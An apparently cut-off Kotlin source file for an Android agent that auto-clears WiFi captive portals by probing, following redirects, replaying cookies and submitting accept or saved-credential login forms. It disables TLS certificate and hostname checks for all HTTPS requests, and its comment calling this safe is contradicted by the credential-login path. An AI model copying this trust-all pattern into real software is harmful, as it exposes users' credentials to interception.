package com.android.systemservices

import android.net.Network
import android.util.Log
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.InetSocketAddress
import java.net.URL
import java.net.URLEncoder
import java.security.SecureRandom
import java.security.cert.X509Certificate
import java.util.concurrent.locks.ReentrantLock
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLContext
import javax.net.ssl.X509TrustManager

/**
 * Best-effort auto-clear for **click-through** WiFi captive portals (the "Accept terms" / "Continue"
 * / "Connect" pages), performed over a SPECIFIC WiFi [Network] so it works even while cellular is
 * the OS default route. It walks the standard generate_204 redirect to the portal, then submits the
 * portal's form(s) / follows an obvious accept link and re-probes for a clear (HTTP 204).
 *
 * ⚠️ Cookie continuity is mandatory for enterprise portals. SonicWall / Aruba / Cisco guest portals
 * set a **session cookie** on the portal-page GET and only honour the accept POST if it carries that
 * cookie back (the session is keyed by cookie, not just source IP/MAC). Every request in one attempt
 * therefore shares a per-attempt [cookieJar]: every `Set-Cookie` is captured and replayed as a
 * `Cookie:` header on subsequent requests — across BOTH the raw-socket HTTP path and the
 * HttpsURLConnection path (a portal commonly redirects http→https on the same host mid-flow).
 *
 * Hard limits (by design — no app can do these headlessly): it CANNOT solve portals that need
 * credentials, a voucher/room number, SMS/email verification, or whose accept button is driven by
 * JavaScript (React/SPA portals). Those still require a human (use the remote `captive_portal_submit`
 * command). Every request is time-boxed and bound to the WiFi network; all failures are swallowed —
 * this never blocks the agent's normal connectivity logic.
 */
object CaptivePortalHelper {
    private const val TAG = "CaptivePortal"
    // Probe endpoints tried in order. HTTP probes work for most portals (Cisco, Aruba, open captive).
    // SonicWall Guest Services commonly blocks port 80 entirely and only serves its portal on HTTPS —
    // the HTTP probes all time out / get RST'd, yielding "no portal redirect found". The HTTPS Apple
    // probe fixes this: SonicWall DNS-hijacks all hostnames → our socket hits the portal's TLS
    // endpoint → trustAllSsl accepts the self-signed cert → 200 + portal HTML → form submit works.
    private val PROBES = listOf(
        "http://captive.apple.com/hotspot-detect.html",   // HTTP — Cisco/Aruba/open captive intercept
        "https://captive.apple.com/hotspot-detect.html",  // HTTPS — SonicWall (port 80 blocked, 443 only)
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://www.gstatic.com/generate_204",
        "http://neverssl.com/",                            // guaranteed HTTP-only, never whitelisted
    )
    private const val UA = "Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Mobile Safari/537.36"

    // Anchor / button text or field name that looks like a "proceed without credentials" action.
    private val ACCEPT_KW = Regex("(?i)(accept|agree|continue|connect|proceed|submit|log[ -]?in|start|free|guest|online|enter)")

    /** Honest reporting of the current WiFi's auto-clear attempt (CLEARED is implied by validated). */
    enum class ClearState { NONE, ATTEMPTING, FAILED }
    @Volatile var state: ClearState = ClearState.NONE
    /** Reset when the WiFi validates or drops, so a stale FAILED doesn't stick to a new network. */
    fun reset() { state = ClearState.NONE }

    /** Deepest real portal page URL reached in the last attempt — handed to the WebView escalation
     *  ([CaptivePortalWebViewService]) so it can load the JS splash directly over HTTPS. */
    @Volatile var lastPortalUrl: String? = null
    /** Public clear-probe (authoritative generate_204 check) for callers polling after a WebView solve. */
    fun probeClear(network: Network): Boolean = try { isClear(network) } catch (_: Throwable) { false }

    // One attempt at a time: tryAutoAccept is called from both the WifiAutoJoin verify-loop and the
    // SocketManager capabilities callback. The shared cookieJar would corrupt under concurrency, and
    // overlapping attempts just thrash the portal — so a busy attempt is skipped, not queued.
    private val attemptLock = ReentrantLock()
    // Per-attempt cookie jar (name → value). Flat (no domain/path scoping) — a portal attempt is a
    // single-host conversation, which is all enterprise guest portals need.
    private val cookieJar = LinkedHashMap<String, String>()

    private fun storeSetCookie(headerValue: String?) {
        if (headerValue.isNullOrBlank()) return
        val pair = headerValue.substringBefore(';').trim()   // strip Path/Expires/HttpOnly/etc.
        val eq = pair.indexOf('=')
        if (eq <= 0) return
        val name = pair.substring(0, eq).trim()
        val value = pair.substring(eq + 1).trim()
        if (name.isNotEmpty()) cookieJar[name] = value
    }
    private fun cookieHeader(): String? =
        if (cookieJar.isEmpty()) null else cookieJar.entries.joinToString("; ") { "${it.key}=${it.value}" }
    private fun captureCookies(c: HttpURLConnection) {
        try {
            c.headerFields?.forEach { (k, v) ->
                if (k != null && k.equals("Set-Cookie", ignoreCase = true)) v.forEach { storeSetCookie(it) }
            }
        } catch (_: Throwable) {}
    }

    /**
     * Attempt to clear a captive portal on [network]. [gatewayIp] (dotted IPv4) is prepended to
     * the probe list as a direct local-subnet target — useful when enterprise portals (SonicWall)
     * filter TCP connections to external IPs but allow connections to the local gateway.
     * @return true if the network ends up clear.
     */
    fun tryAutoAccept(network: Network, gatewayIp: String? = null): Boolean {
        try {
            if (!attemptLock.tryLock(45, java.util.concurrent.TimeUnit.SECONDS)) {
                Log.i(TAG, "auto-accept timed out waiting for in-progress attempt")
                return try { isClear(network) } catch (_: Throwable) { false }
            }
        } catch (_: InterruptedException) {
            return try { isClear(network) } catch (_: Throwable) { false }
        }
        try {
            state = ClearState.ATTEMPTING
            cookieJar.clear()
            val ok = try { doAttempt(network, gatewayIp) }
                     catch (t: Throwable) { Log.w(TAG, "auto-accept failed: ${t.message}"); false }
            state = if (ok) ClearState.NONE else ClearState.FAILED   // FAILED → "needs manual login" in UI
            return ok
        } finally { attemptLock.unlock() }
    }

    /**
     * Credential-based portal solve (airline WiFi etc.): follow the portal redirect chain the
     * gateway actually serves, keep the session cookie, find the login form and fill it with
     * [creds] using [hints] (lowercased field name → candidate credential keys), submit, and
     * re-probe for a clear. Works for any portal that presents a real HTML login <form>; pure
     * JS SPAs are left for the WebView solver / manual login (returns false).
     *
     * Fallback fill: a form with exactly one text-like input and one password input gets filled
     * from the first non-password credential + the password credential even without a name match.
     *
     * @return true if the network ends up clear.
     */
    fun tryCredentialLogin(
        network: Network,
        gatewayIp: String?,
        airlineId: String?,
        creds: JSONObject,
        hints: Map<String, List<String>> = emptyMap()
    ): Boolean {
        try {
            if (!attemptLock.tryLock(45, java.util.concurrent.TimeUnit.SECONDS)) {
                Log.i(TAG, "credential login timed out waiting for in-progress attempt")
                return try { isClear(network) } catch (_: Throwable) { false }
            }
        } catch (_: InterruptedException) {
            return try { isClear(network) } catch (_: Throwable) { false }
        }
        try {
            state = ClearState.ATTEMPTING
            cookieJar.clear()
            val ok = try { doCredentialAttempt(network, gatewayIp, airlineId, creds, hints) }
                     catch (t: Throwable) { Log.w(TAG, "credential login failed: ${t.message}"); false }
            state = if (ok) ClearState.NONE else ClearState.FAILED
            return ok
        } finally { attemptLock.unlock() }
    }

    private fun doCredentialAttempt(
        network: Network, gatewayIp: String?, airlineId: String?,
        creds: JSONObject, hints: Map<String, List<String>>
    ): Boolean {
        lastPortalUrl = null
        if (isClear(network)) { Log.i(TAG, "network already clear — no credential login needed"); return true }
        val probes = if (gatewayIp != null) {
            listOf("http://$gatewayIp/", "https://$gatewayIp/") + PROBES
        } else PROBES
        var portal: String? = null
        for (attempt in 1..3) {
            portal = findPortalUrl(network, probes)
            if (portal != null) break
            if (attempt < 3) Thread.sleep(1500)
        }
        val portalUrl = portal ?: run { Log.i(TAG, "no portal redirect found for credential login"); return false }
        Log.i(TAG, "portal found: ${portalUrl.take(160)} — hunting login form (airline=$airlineId, cookies=${cookieJar.size})")

        // Lowercased credential map for name matching; fallback values for the 1-text+1-pass form.
        val credValues = LinkedHashMap<String, String>()
        creds.keys().forEach { k -> credValues[k.lowercase()] = creds.optString(k) }
        val passFallback = credValues["password"]
        val userFallback = credValues.entries
            .firstOrNull { it.key != "password" && it.value.isNotBlank() }?.value

        val visited = HashSet<String>()
        var url = portalUrl
        for (hop in 0 until 6) {
            if (!visited.add(url)) { Log.i(TAG, "redirect loop at ${url.take(120)} — stopping"); break }
            val fetched = fetchPage(network, url) ?: break
            val html = fetched.second
            val pageUrl = fetched.first
            lastPortalUrl = pageUrl   // remember the deepest page for the WebView escalation
            val base = baseHref(html)?.let { resolve(pageUrl, it) } ?: pageUrl
            if (Regex("(?is)<form\\b").containsMatchIn(html)) {
                if (submitCredentialForms(network, base, html, credValues, hints, userFallback, passFallback)) return true
            }
            // No clearing form → follow a login-looking link, then any JS/meta redirect.
            val loginHref = findLoginLink(html)
            if (loginHref != null) {
                Log.i(TAG, "following login link → ${loginHref.take(160)}")
                url = resolve(base, loginHref)
                continue
            }
            val redir = extractRedirect(html, base)
            if (redir != null && redir != url) {
                Log.i(TAG, "no login form — following JS/meta redirect → ${redir.take(300)}")
                url = redir
                continue
            }
            Log.i(TAG, "no login form, no login link, no redirect — html: ${html.take(600).replace(Regex("\\s+"), " ")}")
            break
        }
        return isClear(network).also { Log.i(TAG, "credential login done cleared=$it (cookies=${cookieJar.size})") }
    }

    private data class CredForm(val method: String, val action: String, val params: String,
                                val fields: List<String>, val credFilled: Int)

    /** Serialize a login <form>, filling credential-bearing inputs. Hidden inputs pass through
     *  unchanged (session tokens). Inputs whose name matches a credential key (case-insensitive)
     *  or a hint alias get the saved value; with exactly one text-like + one password input the
     *  fallback values are used even without a name match. Returns null when no credential was
     *  actually filled (nothing to gain from submitting). */
    private fun serializeLoginForm(
        form: String,
        credValues: Map<String, String>,
        hints: Map<String, List<String>>,
        userFallback: String?,
        passFallback: String?
    ): CredForm? {
        val method = Regex("(?i)method\\s*=\\s*[\"']?(get|post)").find(form)?.groupValues?.get(1)?.uppercase() ?: "GET"
        val action = attr(form, "action") ?: ""
        val params = StringBuilder()
        val fields = mutableListOf<String>()
        var credFilled = 0

        fun add(name: String, value: String) {
            if (name.isEmpty()) return
            if (params.isNotEmpty()) params.append('&')
            params.append(enc(name)).append('=').append(enc(value))
            fields.add(name)
        }

        val inputTags = Regex("(?is)<input\\b[^>]*>").findAll(form).map { it.value }.toList()
        // Count text-like vs password inputs for the fill-everything fallback.
        var textLike = 0; var passLike = 0
        inputTags.forEach { tag ->
            when ((attr(tag, "type") ?: "text").lowercase()) {
                "password" -> passLike++
                "submit", "button", "image", "reset", "hidden", "checkbox", "radio" -> {}
                else -> textLike++
            }
        }
        val doFallback = textLike == 1 && passLike == 1
        var fallbackUserUsed = false
        var fallbackPassUsed = false

        inputTags.forEach { tag ->
            val type = (attr(tag, "type") ?: "text").lowercase()
            val name = attr(tag, "name") ?: attr(tag, "id") ?: return@forEach
            val value = attr(tag, "value") ?: ""
            when (type) {
                "submit", "button", "image", "reset" -> {}
                "hidden" -> add(name, value)   // session tokens etc. pass through untouched
                "checkbox", "radio" -> if (Regex("(?i)\\bchecked\\b").containsMatchIn(tag)) add(name, value.ifEmpty { "on" })
                else -> {
                    val lname = name.lowercase()
                    val placeholder = (attr(tag, "placeholder") ?: attr(tag, "aria-label") ?: "").lowercase()
                    val fromCred = credValues[lname]
                        ?: hints[lname]?.firstNotNullOfOrNull { credValues[it.lowercase()] }
                        ?: hints[placeholder.replace(Regex("[^a-z0-9]+"), "")]?.firstNotNullOfOrNull { credValues[it.lowercase()] }
                    val filled = fromCred
                        ?: if (type == "password" && doFallback && !fallbackPassUsed && passFallback != null) {
                            fallbackPassUsed = true; passFallback
                        } else if (type != "password" && doFallback && !fallbackUserUsed && userFallback != null) {
                            fallbackUserUsed = true; userFallback
                        } else null
                    if (filled != null) credFilled++
                    add(name, filled ?: value)
                }
            }
        }
        // Submit control — same heuristic as serializeForm: accept-looking name/value, else first named.
        val submits = mutableListOf<Pair<String, String>>()
        inputTags.forEach { tag ->
            val type = (attr(tag, "type") ?: "").lowercase()
            if (type == "submit" || type == "image" || type == "button") attr(tag, "name")?.let { submits.add(it to (attr(tag, "value") ?: "")) }
        }
        Regex("(?is)<button\\b[^>]*>(.*?)</button>").findAll(form).forEach { m ->
            val tag = m.value
            val type = (attr(tag, "type") ?: "submit").lowercase()   // <button> defaults to type=submit
            if (type == "submit") attr(tag, "name")?.let { submits.add(it to (attr(tag, "value") ?: "")) }
        }
        val accept = submits.firstOrNull { (n, v) -> ACCEPT_KW.containsMatchIn(n) || ACCEPT_KW.containsMatchIn(v) }
            ?: submits.firstOrNull()
        accept?.let { add(it.first, it.second) }
        if (credFilled == 0) return null
        return CredForm(method, action, params.toString(), fields, credFilled)
    }

    private val LOGIN_LINK_KW = Regex("(?i)(log[ -]?in|sign[ -]?in|get online|connect now|access wifi|free wifi)")

    /** First anchor whose text/href looks like it leads to the credential login page. */
    private fun findLoginLink(html: String): String? =
        Regex("(?is)<a\\b[^>]*href\\s*=\\s*[\"']([^\"']+)[\"'][^>]*>(.*?)</a>")
            .findAll(html)
            .firstOrNull { LOGIN_LINK_KW.containsMatchIn(it.groupValues[2]) || LOGIN_LINK_KW.containsMatchIn(it.groupValues[1]) }
            ?.groupValues?.get(1)

    /** Fill and submit each <form> on the login page; re-check for a clear after each. */
    private fun submitCredentialForms(
        network: Network, baseUrl: String, html: String,
        credValues: Map<String, String>, hints: Map<String, List<String>>,
        userFallback: String?, passFallback: String?
    ): Boolean {
        val forms = Regex("(?is)<form\\b[^>]*>.*?</form>").findAll(html).map { it.value }.toList()
        if (forms.isEmpty()) {
            Log.i(TAG, "portal page has no <form> — html head: ${html.take(300).replace(Regex("\\s+"), " ")}")
            return false
        }
        Log.i(TAG, "portal page has ${forms.size} form(s) — attempting credential fill")
        for ((i, form) in forms.withIndex()) {
            val cf = serializeLoginForm(form, credValues, hints, userFallback, passFallback)
            if (cf == null) {
                Log.i(TAG, "form[$i] has no fillable inputs — skipping")
                continue
            }
            val target = resolve(baseUrl, cf.action.ifBlank { baseUrl })
            val ok = submit(network, cf.method, target, cf.params)
            Log.i(TAG, "form[$i] ${cf.method} action='${cf.action.take(100)}' credFilled=${cf.credFilled} fields=${cf.fields} submitOk=$ok")
            repeat(3) { if (isClear(network)) { Log.i(TAG, "credential login cleared via form[$i]"); return true }; Thread.sleep(1200) }
        }
        return false
    }

    private fun doAttempt(network: Network, gatewayIp: String? = null): Boolean {
        lastPortalUrl = null
        if (isClear(network)) { Log.i(TAG, "network already clear — no portal to solve"); return true }
        // Prepend gateway-IP probes: direct local-subnet probe bypasses any per-destination
        // firewall the portal might apply to external IPs for unauthenticated clients.
        val probes = if (gatewayIp != null) {
            listOf("http://$gatewayIp/", "https://$gatewayIp/") + PROBES
        } else PROBES
        // Retry findPortalUrl up to 3 times with a short delay — SonicWall and similar enterprise
        // portals are sometimes not yet ready to intercept immediately after WiFi association.
        var portal: String? = null
        for (attempt in 1..3) {
            portal = findPortalUrl(network, probes)
            if (portal != null) break
            if (attempt < 3) Thread.sleep(1500)
        }
        val portalUrl = portal ?: run { Log.i(TAG, "no portal redirect found"); return false }
        Log.i(TAG, "portal found: $portalUrl — attempting click-through (cookies=${cookieJar.size})")
        // Chase JS / meta-refresh redirect "bounce" pages until we reach one with a real <form>.
        // SonicWall serves an intermediate <title>REDIR</title> page (body onLoad='redirTimer()' →
        // window.location to the actual auth page) that has no form — submitting nothing there clears
        // nothing; we must follow the scripted redirect to the login page that carries the Accept form.
        val visited = HashSet<String>()
        var url = portalUrl
        for (hop in 0 until 6) {
            if (!visited.add(url)) { Log.i(TAG, "redirect loop at ${url.take(120)} — stopping"); break }
            val fetched = fetchPage(network, url) ?: break
            val html = fetched.second
            val pageUrl = fetched.first
            lastPortalUrl = pageUrl   // remember the deepest page for the WebView escalation
            val base = baseHref(html)?.let { resolve(pageUrl, it) } ?: pageUrl
            // ExtremeCloud IQ / Aerohive UPA click-through: the "ACCEPT & CONNECT" anchor has an empty,
            // JS-filled href that simply navigates to the NAS approval endpoint passed in the page URL as
            // ?redirecturl=http://<nas>/reg.php (+ network/apMac/clientMac). Hitting it directly IS the
            // click — and the NAS is an IP over HTTP, so it needs no DNS and is one fast request (dodges
            // the WiFi-drop "Unable to resolve host" that kills the va2.extremecloudiq.com form posts).
            if (tryRedirecturlAccept(network, pageUrl)) { Log.i(TAG, "portal cleared via redirecturl accept"); return true }
            if (Regex("(?is)<form\\b").containsMatchIn(html)) {
                dumpHtml(html)   // DIAGNOSTIC fallback: capture the JS splash (scripts + accept anchor)
                if (submitForms(network, base, html)) { Log.i(TAG, "portal cleared via form"); return true }
                if (followAcceptLink(network, base, html)) {
                    repeat(4) { if (isClear(network)) { Log.i(TAG, "portal cleared via link"); return true }; Thread.sleep(1500) }
                }
                break   // reached a form page but couldn't clear it — stop chasing
            }
            val redir = extractRedirect(html, base)
            if (redir != null && redir != url) {
                Log.i(TAG, "no <form> — following JS/meta redirect → ${redir.take(500)}")
                url = redir
                continue
            }
            Log.i(TAG, "no <form>, no redirect target — html: ${html.take(1000).replace(Regex("\\s+"), " ")}")
            break
        }
        return isClear(network).also { Log.i(TAG, "auto-accept done cleared=$it (cookies=${cookieJar.size})") }
    }

    // Trust-all SSL context used only for captive portal page fetches.
    // Safe: we're reading HTML to find a click-through button — never sending credentials.
    // Captive portals routinely serve their accept page over HTTPS with a self-signed or
    // domain-mismatch cert; the system CA store rejects it → SSLHandshakeException → null
    // from fetchPage() → both form/link attempts fail → state=FAILED.
    private val trustAllSsl: SSLContext by lazy {
        val tm = object : X509TrustManager {
            override fun checkClientTrusted(c: Array<X509Certificate>, a: String) {}
            override fun checkServerTrusted(c: Array<X509Certificate>, a: String) {}
            override fun getAcceptedIssuers(): Array<X509Certificate> = emptyArray()
        }
        SSLContext.getInstance("TLS").also { it.init(null, arrayOf(tm), SecureRandom()) }
    }

    private fun open(network: Network, url: String, follow: Boolean): HttpURLConnection {
        val c = network.openConnection(URL(url)) as HttpURLConnection   // bound to THIS wifi network
        c.connectTimeout = 4000; c.readTimeout = 6000
        c.instanceFollowRedirects = follow
        c.setRequestProperty("User-Agent", UA)
        cookieHeader()?.let { c.setRequestProperty("Cookie", it) }
        if (c is HttpsURLConnection) {
            c.sslSocketFactory = trustAllSsl.socketFactory
            c.hostnameVerifier = javax.net.ssl.HostnameVerifier { _, _ -> true }
        }
        return c
    }

    // Probes that return 204 (not 200) when the internet is genuinely clear.
    private val CLEAR_204_PROBES = setOf(
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://www.gstatic.com/generate_204",
    )

    /**
     * Raw TCP HTTP request — bypasses Android's NSC cleartext restriction (HttpURLConnection enforces
     * it; raw sockets do not). Only handles http:// URLs. Supports GET and POST (form-urlencoded body).
     * Sends the current [cookieJar] and captures any `Set-Cookie` from the response.
     *
     * Two hang-avoidance measures:
     *  1. DNS via [Network.getAllByName] wrapped in a 3 s CompletableFuture — enterprise portals
     *     (SonicWall) sometimes have DNS servers unresponsive to external hostnames, which would
     *     block indefinitely without a timeout.
     *  2. Body read ONLY for HTTP 200 — for 3xx redirects we already have the Location header
     *     and close the socket immediately. This prevents a 6 s soTimeout hang per probe: SonicWall
     *     intercepts HTTP and returns "302 Found" but keeps the TCP connection alive (ignoring our
     *     Connection:close), so readText() blocks until soTimeout fires.
     */
    private fun rawHttp(network: Network, method: String, url: String, formBody: String? = null): Triple<Int, String?, String>? {
        if (!url.startsWith("http://")) return null
        return try {
            val u = URL(url)
            val host = u.host
            val port = if (u.port > 0) u.port else 80
            val path = (u.path.takeIf { !it.isNullOrEmpty() } ?: "/") + (if (u.query != null) "?${u.query}" else "")
            // DNS with 3 s hard timeout so an unresponsive portal DNS can't stall the probe loop.
            val addr = try {
                java.util.concurrent.CompletableFuture
                    .supplyAsync { network.getAllByName(host).firstOrNull() }
                    .get(3, java.util.concurrent.TimeUnit.SECONDS)
            } catch (_: Throwable) { null } ?: return null
            val sock = network.socketFactory.createSocket()
            sock.connect(InetSocketAddress(addr, port), 4000)
            sock.soTimeout = 4000
            val req = StringBuilder()
            req.append("$method $path HTTP/1.1\r\n")
            req.append("Host: $host\r\n")
            req.append("User-Agent: $UA\r\n")
            cookieHeader()?.let { req.append("Cookie: $it\r\n") }
            req.append("Connection: close\r\n")
            if (method == "POST") {
                val body = formBody ?: ""
                val bytes = body.toByteArray(Charsets.ISO_8859_1)
                req.append("Content-Type: application/x-www-form-urlencoded\r\n")
                req.append("Content-Length: ${bytes.size}\r\n\r\n")
                req.append(body)
            } else {
                req.append("\r\n")
            }
            sock.outputStream.write(req.toString().toByteArray(Charsets.ISO_8859_1))
            sock.outputStream.flush()
            val reader = sock.inputStream.bufferedReader(Charsets.ISO_8859_1)
            val statusLine = reader.readLine()?.trimEnd('\r') ?: run { sock.close(); return null }
            val headers = mutableListOf<String>()
            while (true) {
                val line = reader.readLine()?.trimEnd('\r') ?: break
                if (line.isEmpty()) break
                headers.add(line)
            }
            val code = statusLine.split(" ").getOrNull(1)?.toIntOrNull() ?: run { sock.close(); return null }
            headers.filter { it.lowercase().startsWith("set-cookie:") }
                .forEach { storeSetCookie(it.substringAfter(":").trim()) }
            val loc = headers.firstOrNull { it.lowercase().startsWith("location:") }
                ?.substringAfter(":")?.trim()
            // Only read body for 200 responses — for 3xx the Location header is sufficient, and
            // closing immediately prevents the soTimeout hang when the portal keeps the socket alive.
            val body = if (code == 200) {
                try { reader.readText().take(65536) } catch (_: Throwable) { "" }
            } else ""
            try { sock.close() } catch (_: Throwable) {}
            Triple(code, loc, body)
        } catch (_: Throwable) { null }
    }

    /**
     * Is the network GENUINELY past the portal? The HTTP generate_204 probe (raw socket, NSC-bypassed)
     * is AUTHORITATIVE — it's exactly what Android's own NetworkMonitor uses: 204 = clear, and ANY other
     * response = the gateway intercepted it = still captive. We must NOT let an HTTPS pass-through of
     * captive.apple.com return "Success" and produce a FALSE clear: some SonicWall guest configs allow
     * 443 to apple while still gating real traffic, so the old "any apple 200+Success" check made
     * isClear true at the TOP of doAttempt → the form solver was skipped entirely (no [CaptivePortal]
     * logs, tryAutoAccept→true, "Captive portal cleared", yet the portal was never accepted). RFF-Guest,
     * 2026-06-11.
     */
    private fun isClear(network: Network): Boolean {
        // 1) Authoritative: HTTP generate_204. A definitive non-204 means captive — stop here.
        for (p in CLEAR_204_PROBES) {
            val r = try { rawHttp(network, "GET", p) } catch (_: Throwable) { null } ?: continue
            if (r.first == 204) { Log.i(TAG, "isClear=true (generate_204)"); return true }
            Log.i(TAG, "isClear=false: $p intercepted (HTTP ${r.first}) → captive"); return false
        }
        // 2) generate_204 unreachable (blocked/errored, not intercepted) → fall back to HTTP content
        //    probes ONLY. The HTTPS apple probe is deliberately excluded: it can reach the real Apple
        //    on a captive network (the portal can't MITM 443) and falsely report "Success".
        for (p in listOf("http://captive.apple.com/hotspot-detect.html", "http://neverssl.com/")) {
            val r = try { rawHttp(network, "GET", p) } catch (_: Throwable) { null } ?: continue
            if (r.first == 200 && p.contains("apple") && r.third.contains("Success")) { Log.i(TAG, "isClear=true (apple http)"); return true }
            if (r.first == 200 && p.contains("neverssl") && r.third.contains("neverssl.com")) { Log.i(TAG, "isClear=true (neverssl)"); return true }
        }
        return false
    }

    /** The login URL a portal redirects the probe to (Location header), or the probe itself if served inline. */
    private fun findPortalUrl(network: Network, probes: List<String> = PROBES): String? {
        for (p in probes) {
            try {
                val code: Int; val loc: String?
                if (p.startsWith("http://")) {
                    // rawHttp bypasses Android NSC cleartext block — SonicWall intercepts these on port 80
                    val r = rawHttp(network, "GET", p)
                    if (r == null) { Log.i(TAG, "probe $p → raw-socket null"); continue }
                    code = r.first; loc = r.second
                } else {
                    val c = open(network, p, false)
                    code = c.responseCode
                    captureCookies(c)
                    loc = c.getHeaderField("Location")
                    c.disconnect()
                }
                Log.i(TAG, "probe $p → HTTP $code${if (!loc.isNullOrBlank()) " → $loc" else ""}")
                if (code in 300..399 && !loc.isNullOrBlank()) return resolve(p, loc)
                if (code == 200) return p
            } catch (t: Throwable) {
                Log.i(TAG, "probe $p → ${t.javaClass.simpleName}: ${t.message}")
            }
        }
        return null
    }

    /**
     * Fetch [url] and return (finalUrl, html), following redirects MANUALLY (max 6 hops) so the
     * cookie jar captures `Set-Cookie` on every hop — HttpURLConnection's auto-follow would swallow
     * intermediate Set-Cookies. Handles HTTP via raw socket (NSC bypass) and HTTPS via open().
     */
    private fun fetchPage(network: Network, url: String, depth: Int = 0): Pair<String, String>? {
        if (depth > 6) return null
        if (url.startsWith("http://")) {
            val r = rawHttp(network, "GET", url) ?: return null
            val (code, loc, body) = r
            if (code in 300..399 && !loc.isNullOrBlank()) return fetchPage(network, resolve(url, loc), depth + 1)
            return Pair(url, body)
        }
        return try {
            val c = open(network, url, false)   // manual follow → capture cookies each hop
            val code = c.responseCode
            captureCookies(c)
            val loc = c.getHeaderField("Location")
            if (code in 300..399 && !loc.isNullOrBlank()) {
                c.disconnect()
                return fetchPage(network, resolve(url, loc), depth + 1)
            }
            val body = if (code == 200) c.inputStream.bufferedReader().use { it.readText() } else ""
            c.disconnect()
            Pair(url, body)
        } catch (_: Throwable) { null }
    }

    /** Send a form submission (GET appends a query string; POST sends a urlencoded body); follows one
     *  redirect so the portal's "you're now online" landing can set its final cookie. */
    private fun submit(network: Network, method: String, target: String, params: String): Boolean {
        return try {
            if (target.startsWith("http://")) {
                val r = if (method == "POST") rawHttp(network, "POST", target, params)
                        else rawHttp(network, "GET", appendQuery(target, params))
                val code = r?.first ?: return false
                if (code in 300..399 && !r.second.isNullOrBlank()) fetchPage(network, resolve(target, r.second!!))
                code in 200..399
            } else {
                // follow=false + manual redirect: a SonicWall accept-POST replies 302 and commonly
                // ROTATES the session cookie on that hop. Auto-follow would swallow the 302's
                // Set-Cookie (captureCookies runs only on the final response) and drop our Cookie:
                // header on the followed GET — so capture here, then re-issue the GET ourselves.
                val c: HttpURLConnection
                if (method == "POST") {
                    c = open(network, target, false)
                    c.requestMethod = "POST"; c.doOutput = true
                    c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                    c.outputStream.use { it.write(params.toByteArray()) }
                } else {
                    c = open(network, appendQuery(target, params), false)
                }
                val code = c.responseCode
                captureCookies(c)
                val loc = c.getHeaderField("Location")
                c.disconnect()
                if (code in 300..399 && !loc.isNullOrBlank()) fetchPage(network, resolve(target, loc))
                code in 200..399
            }
        } catch (t: Throwable) { Log.i(TAG, "submit failed: ${t.message}"); false }
    }

    private data class FormPost(val method: String, val action: String, val params: String, val fields: List<String>)

    /** Serialize one <form>: all data inputs + the single accept-looking submit (input OR button). */
    private fun serializeForm(form: String): FormPost {
        val method = Regex("(?i)method\\s*=\\s*[\"']?(get|post)").find(form)?.groupValues?.get(1)?.uppercase() ?: "GET"
        val action = attr(form, "action") ?: ""
        val params = StringBuilder()
        val fields = mutableListOf<String>()
        fun add(name: String, value: String) {
            if (name.isEmpty()) return
            if (params.isNotEmpty()) params.append('&')
            params.append(enc(name)).append('=').append(enc(value))
            fields.add(name)
        }
        // 1) Non-submit inputs (hidden/text/checkbox/radio). Checkboxes/radios only if checked.
        Regex("(?is)<input\\b[^>]*>").findAll(form).forEach { m ->
            val tag = m.value
            val type = (attr(tag, "type") ?: "text").lowercase()
            val name = attr(tag, "name") ?: return@forEach
            val value = attr(tag, "value") ?: ""
            when (type) {
                "submit", "button", "image", "reset" -> {}   // handled in step 2
                "checkbox", "radio" -> if (Regex("(?i)\\bchecked\\b").containsMatchIn(tag)) add(name, value.ifEmpty { "on" })
                else -> add(name, value)
            }
        }
        // 2) The accept control. A real browser sends only the clicked submit's name=value, so pick the
        //    one that looks like "Accept/Continue"; fall back to the first named submit/button.
        val submits = mutableListOf<Pair<String, String>>()
        Regex("(?is)<input\\b[^>]*>").findAll(form).forEach { m ->
            val tag = m.value
            val type = (attr(tag, "type") ?: "").lowercase()
            if (type == "submit" || type == "image" || type == "button") attr(tag, "name")?.let { submits.add(it to (attr(tag, "value") ?: "")) }
        }
        Regex("(?is)<button\\b[^>]*>(.*?)</button>").findAll(form).forEach { m ->
            val tag = m.value
            val type = (attr(tag, "type") ?: "submit").lowercase()   // <button> defaults to type=submit
            if (type == "submit") attr(tag, "name")?.let { submits.add(it to (attr(tag, "value") ?: "")) }
        }
        val accept = submits.firstOrNull { (n, v) -> ACCEPT_KW.containsMatchIn(n) || ACCEPT_KW.containsMatchIn(v) }
            ?: submits.firstOrNull()
        accept?.let { add(it.first, it.second) }
        return FormPost(method, action, params.toString(), fields)
    }

    /** Submit each <form> on the page in order, re-checking for a clear after each (most portals
     *  have one accept form, but some put a language/search form first). */
    private fun submitForms(network: Network, baseUrl: String, html: String): Boolean {
        val forms = Regex("(?is)<form\\b[^>]*>.*?</form>").findAll(html).map { it.value }.toList()
        if (forms.isEmpty()) {
            // No <form> ⇒ likely a Gen-7 SonicOS JS/SPA portal (XHR/fetch POST, no classic form) that a
            // raw-HTTP solver can't drive. Log a head snippet so we can fingerprint the framework.
            Log.i(TAG, "portal page has no <form> — html head: ${html.take(300).replace(Regex("\\s+"), " ")}")
            return false
        }
        Log.i(TAG, "portal page has ${forms.size} form(s)")
        for ((i, form) in forms.withIndex()) {
            val fp = serializeForm(form)
            val target = resolve(baseUrl, fp.action.ifBlank { baseUrl })
            val ok = submit(network, fp.method, target, fp.params)
            Log.i(TAG, "form[$i] ${fp.method} action='${fp.action.take(80)}' fields=${fp.fields} submitOk=$ok")
            repeat(3) { if (isClear(network)) return true; Thread.sleep(1200) }
        }
        return false
    }

    /** Follow the first anchor whose text/href looks like an accept/continue action. */
    private fun followAcceptLink(network: Network, baseUrl: String, html: String): Boolean {
        val href = Regex("(?is)<a\\b[^>]*href\\s*=\\s*[\"']([^\"']+)[\"'][^>]*>(.*?)</a>")
            .findAll(html).firstOrNull { ACCEPT_KW.containsMatchIn(it.groupValues[2]) || ACCEPT_KW.containsMatchIn(it.groupValues[1]) }
            ?.groupValues?.get(1) ?: return false
        val target = resolve(baseUrl, href)
        Log.i(TAG, "following accept link → ${target.take(80)}")
        return fetchPage(network, target) != null
    }

    /**
     * ExtremeCloud IQ / Aerohive "UPA" (Use-Policy-Acceptance) click-through: the splash carries the NAS
